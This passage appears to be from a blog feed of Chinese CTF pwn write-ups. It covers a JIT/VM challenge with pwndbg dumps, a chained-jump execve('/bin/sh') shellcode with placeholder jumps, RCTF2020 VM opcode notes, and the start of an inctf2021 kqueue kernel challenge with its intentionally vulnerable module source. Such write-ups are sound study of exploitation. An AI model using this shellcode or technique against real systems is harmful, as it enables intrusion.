class=\"number\">0x4b3840</span> ◂— ...</span><br><span class=\"line\"> R8   <span class=\"number\">0x4def70</span> ◂— <span class=\"number\">0x637566</span> <span class=\"comment\">/* &#x27;fuc&#x27; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">28</span>gx <span class=\"number\">0x48af78</span><span class=\"number\">-0x18</span></span><br><span class=\"line\"><span class=\"number\">0x48af60</span>:\t<span class=\"number\">0x0000000000000040</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x48af70</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000004ddf80</span></span><br><span class=\"line\"><span class=\"number\">0x48af80</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x5000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x48af90</span>:\t<span class=\"number\">0x00000000004ddf50</span>\t<span class=\"number\">0x0000000000004000</span></span><br><span class=\"line\"><span class=\"number\">0x48afa0</span>:\t<span class=\"number\">0x00000000004dbc30</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x48afb0</span>:\t<span class=\"number\">0x00000000004dbc48</span>\t<span class=\"number\">0x00000000004dbc48</span></span><br><span class=\"line\"><span class=\"number\">0x48afc0</span>:\t<span class=\"number\">0x00000000004df4d8</span>\t<span class=\"number\">0x00000000004df4d8</span></span><br><span class=\"line\"><span class=\"number\">0x48afd0</span>:\t<span class=\"number\">0x00000000004df490</span>\t<span class=\"number\">0x0000000000000001</span></span><br><span class=\"line\"><span class=\"number\">0x48afe0</span>:\t<span class=\"number\">0x00000000004ddec0</span>\t<span class=\"number\">0x00000000004de308</span></span><br><span class=\"line\"><span class=\"number\">0x48aff0</span>:\t<span class=\"number\">0x00000000000000bc</span>\t<span class=\"number\">0x0000000000000051</span></span><br><span class=\"line\"><span class=\"number\">0x48b000</span>:\t<span class=\"number\">0x00007fff00000000</span>\t<span class=\"number\">0x000000000048c410</span></span><br><span class=\"line\"><span class=\"number\">0x48b010</span>:\t<span class=\"number\">0x000000000048b120</span>\t<span class=\"number\">0x000000000048acf0</span></span><br><span class=\"line\"><span class=\"number\">0x48b020</span>:\t<span class=\"number\">0x000000000048b030</span>\t<span class=\"number\">0x000000000000000a</span></span><br><span class=\"line\"><span class=\"number\">0x48b030</span>:\t<span class=\"number\">0x766e6f6761786568</span>\t<span class=\"number\">0xffffffffff003536</span></span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>关于 handle 函数貌似并没有进行的优化，而是对原有的文件的处理，使用的是堆栈将原来的程序倒序储存进空间内。但是他这里的程序使用的汇编的指令比较少，add，sub，movabs，mul，dec，inc，rax 依旧是程序的返回值，所以最开始一定是对 rax 的初始化。程序的漏洞在于我们可用于储存指令的空间只有 0xff0，但是 mprotect 设置的是 0x1000. 而且程序在防止我们超出空间的时候检查是否小于 X+0xff0，但是如果我们控制知名的长度，将这个位置恰好覆盖为 shellcode。我们在写 add,sub 的汇编时，程序会将其全部转为 mov rbx,xxx,add rax,rbx. 我们可向内存中写入 8 字节的 64 位数，我们可以利用这个。在汇编中 \\xeb 对应的指令默认的偏移量时 2，\\xeb\\x00 jmp 2. 结合上述，我们在第一个函数的结尾，向 0xff0 布置一个 i64, 使其跳转到某个存有 i64 的内存位置。我们通过这样多次跳转一步步完成 shellcoe 的布局，每次跳转栈两字节，所以每条指令不可以超过 6 字节。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push <span class=\"number\">0x68732f</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">shl rax,<span class=\"number\">0x20</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">add rax,<span class=\"number\">0x6069622f</span></span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">push rax</span><br><span class=\"line\">mov rdi,rsp</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">xor rdx,rdx</span><br><span class=\"line\">push <span class=\"number\">0x39</span></span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">xor rsi,rsi</span><br><span class=\"line\">pop rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n<p>RCTF2020</p>\n<p>直接给出了手写的 vm 可执行程序，我们需要理清楚里面的函数逻辑。重点在与子进程中的两个函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums_IR = sub_1A75(file);                   // 解析我们输入的数据</span><br><span class=\"line\">   sub_E99(file, nums_IR);</span><br></pre></td></tr></table></figure>\n<p>首先当我们输入某种编码形式的指令后，第一个函数会检查我们的输入是否合法，并计算出我们输入了多少条完整的指令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">解析输入是否合法的时候，有一些op码，大致县分为三块，小于9，等于9以及大于9小于</span><br><span class=\"line\">0\t1\t2\t3三条指令，根据下1字节的标志，1：有一个寄存器和8字节的数据，0：两个寄存器</span><br><span class=\"line\">\t0\t\t\t\t\t1:ADD RI,IMM64;\t\t0:ADD RI,RI</span><br><span class=\"line\">\t1\t\t\t\t\t1:SUB RI,IMM64;\t\t0:SUB RI,RI</span><br><span class=\"line\">\t2\t\t\t\t\t1:MUL RI,IMM64;\t\t0:MUL RI,RI</span><br><span class=\"line\">\t3\t\t\t\t\t1:DIV RI IMM64; \t0:DIV RI ,RI</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">4\t有一个标志位字节，条件1下，后面有9字节的任意数据，条件2需要两个寄存器</span><br><span class=\"line\">\t\t1:MOV RI,IMM64\t\t\t;4\t\t\tMOV RI,[IMM64]</span><br><span class=\"line\">\t\t8:MOV RI,RI\t\t\t\t;0X10\t\tMOV RI1,[RI2]</span><br><span class=\"line\">\t\t0X20:MOV [RI1],RI2</span><br><span class=\"line\">5\t一字节的寄存器号。将ptr+0x50 的值设置为寄存器中的值。    jmp ri</span><br><span class=\"line\"></span><br><span class=\"line\">6\t一字节的数据标志位。1：AND RI,IMM64;\t\t0: AND RI,RI</span><br><span class=\"line\">7\tp=1:1B，8B   XOR RI,IMM64;\t\t\tp=0:1B,1B\tXOR RI,RI\t\t\t\t</span><br><span class=\"line\">8\t标志位\t，1：或操作，or ri，imm64  ； 0：两个寄存器或操作，destri为第一个  XOR RI,RI</span><br><span class=\"line\">9\t需要一个寄存器，\t\t\t\t2B长,设置寄存器\t\tNOT RI</span><br><span class=\"line\"></span><br><span class=\"line\">10\t需要一个标志位p,为0或者1，&#123;1的时候，后面又8字节的数据，使得ptr+0x40的指针地址-8，并设置为指针指向的值为value，为0的时候，后面紧跟一个寄存器,&#125;\t\t\t\t\t\t\t\tpush imm64/push ri</span><br><span class=\"line\">11\t检查ptr+88，要求非零，然后标志数值减一，后面还跟着一字节的数据.ptr+64指针指向的数据+8\t\tpop RI</span><br><span class=\"line\"></span><br><span class=\"line\">12\t需要1B的操作数，\t\t\t\t 2BIR\t\t指令跳转。1B的偏移量，默认+2(吓一个指令)</span><br><span class=\"line\">13\t对应一个4字节的value（size）\t\t\t\t5B，ptr+72存的是指针数组，栈，这里会被释放，地址由ptr+92提供数组下标索引,size用于malloc的操作，\t\t\tfree旧的stack，创建一个新的</span><br><span class=\"line\">14\t无操作数\t\t\t\t\t\t\t 1B\t\tNOP</span><br><span class=\"line\"></span><br><span class=\"line\">初步分析，大概有8个寄存器（ (unsigned __int8)getbyte_value(position + 2) &gt; 7u）</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>vm_file 的结构体</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0\t\t\tR0</span><br><span class=\"line\">0x8\t\t\tR1</span><br><span class=\"line\">0x10\t\tR2</span><br><span class=\"line\">0x18\t\tR3</span><br><span class=\"line\">0x20\t\tR4</span><br><span class=\"line\">0x28\t\tR5</span><br><span class=\"line\">0x30\t\tR6</span><br><span class=\"line\">0x38\t\tR7</span><br><span class=\"line\"></span><br><span class=\"line\">0x40\t\tmalloc申请出来的指针 用作rsp</span><br><span class=\"line\">0x48\t\tchunk结束的地方，栈顶的地址\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">0x50\t\tPC</span><br><span class=\"line\">0x58(4B)\t\tmalloc后标记为0，stck是否为空，stack的length</span><br><span class=\"line\">0x5c\t\tchunk的实际空间大小,stack的字节大小</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>stack 是在 pc 之后申请的，通过 jmp 可以将微程序劫持到 vm_stack 上面，一字节的最大跳转时 0xff，pc 为 0x010 大小</p>\n",
            "tags": [
                "Learning"
            ]
        },
        {
            "id": "http://example.com/2022/05/03/inctf2021-kqueue/",
            "url": "http://example.com/2022/05/03/inctf2021-kqueue/",
            "title": "inctf2021_kqueue",
            "date_published": "2022-05-03T11:51:43.000Z",
            "content_html": "<h1 id=\"inctf2021-pwn-kqueueheap_overflow\"><a class=\"markdownIt-Anchor\" href=\"#inctf2021-pwn-kqueueheap_overflow\">#</a> Inctf2021 pwn kqueue\t\theap_overflow</h1>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<p>首先这个文件系统解压出来重新打包会出现问题，因为按照上一篇博客所讲的，创建 file_system 文件夹后，把文件系统的包丢进去，一旦更改后缀名称就是导致归档失败，无法使用 gunzip 进行解包。手动提取后，使用 find 打包，会导致我们启动的时候，报错我们没有挂载的权限。所以我没有重新打包。</p>\n<p>提取出来的 vmlinux</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/wykernel/inctf2021_kqueue$ checksec vmlinux</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/wykernel/inctf2021_kqueue/vmlinux&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0xffffffff81000000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>文件系统加载了一个 mod，就是 kqueue</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/wykernel/inctf2021_kqueue/file_system/root$ checksec --file=kqueue.ko</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/wykernel/inctf2021_kqueue/file_system/root/kqueue.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>\n<p>之开启了 canary 以及 NX 保护，（这里的 NX 就不允许我们执行用户态代码）</p>\n<p>chall, 启动脚本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exec</span> qemu-system-x86_64 \\</span><br><span class=\"line\">    -cpu kvm64 \\</span><br><span class=\"line\">    -m 512 \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -kernel <span class=\"string\">&quot;bzImage&quot;</span> \\</span><br><span class=\"line\">    -append <span class=\"string\">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \\</span><br><span class=\"line\">    -monitor /dev/null \\</span><br><span class=\"line\">    -initrd <span class=\"string\">&quot;./rootfs.cpio&quot;</span> \\</span><br><span class=\"line\">    -net user \\</span><br><span class=\"line\">    -net nic</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>开启了 kaslr 地址随机化</p>\n<p>下面就是我们对题目的逆向</p>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<p>xlab&amp;slub 分配</p>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<p>题目加载了 kqueue 的模块，题目直接给出了源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Generic header files */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/kernel.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/module.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/device.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/mutex.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/fs.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/slab.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/uaccess.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;kqueue.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> GCC push_options</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> GCC optimize (<span class=\"string\">&quot;O1&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">kqueue_ioctl</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> cmd, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">long</span> result;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">request_t</span> request;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mutex_lock(&amp;operations_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (copy_from_user((<span class=\"type\">void</span> *)&amp;request, (<span class=\"type\">void</span> *)arg, <span class=\"keyword\">sizeof</span>(<span class=\"type\">request_t</span>)))&#123;</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(cmd)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> CREATE_KQUEUE:</span><br><span class=\"line\">            result = create_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> DELETE_KQUEUE:</span><br><span class=\"line\">            result = delete_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> EDIT_KQUEUE:</span><br><span class=\"line\">            result = edit_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SAVE:</span><br><span class=\"line\">            result = save_kqueue_entries(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            result = INVALID;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">ret: </span><br><span class=\"line\">    mutex_unlock(&amp;operations_lock);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">create_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> result = INVALID;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries&lt;<span class=\"number\">1</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Asking for too much is also not good */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Initialize kqueue_entry structure */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class=\"line\">    ull space = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_umulll_overflow(<span class=\"keyword\">sizeof</span>(queue_entry),(request.max_entries+<span class=\"number\">1</span>),&amp;space) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class=\"line\">    ull queue_size = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_saddll_overflow(<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>),space,&amp;queue_size) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Total size should not exceed a certain limit */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queue_size&gt;<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>) + <span class=\"number\">0x10000</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* All checks done , now call kzalloc */</span></span><br><span class=\"line\">    <span 